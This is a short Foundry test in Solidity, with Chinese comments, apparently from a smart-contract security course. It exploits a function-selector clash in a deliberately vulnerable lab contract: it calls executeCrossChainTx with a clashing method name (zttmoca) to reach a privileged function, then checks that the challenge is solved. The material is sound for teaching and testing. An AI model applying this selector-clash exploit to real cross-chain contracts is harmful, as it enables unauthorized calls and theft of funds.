// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {SelectorClash} from "../S02_SelectorClash.sol";
import {Test} from "forge-std/Test.sol";

contract SelectorClash_Test is Test {
  function testSelectorClash() public {
    // putCurEpochConPubKeyBytes(bytes) 方法的selector等于 0x41973cd9
    // 在 https://openchain.xyz/signatures 上可以查询到这个selector对应的多个方法，
    // 这里取其中一个：zttmoca(bytes,bytes,uint64)
    SelectorClash selectorClash = new SelectorClash();
    selectorClash.executeCrossChainTx(bytes("zttmoca"), abi.encode(hex"", hex"", 0));
    assertEq(selectorClash.solved(), true);
  }
}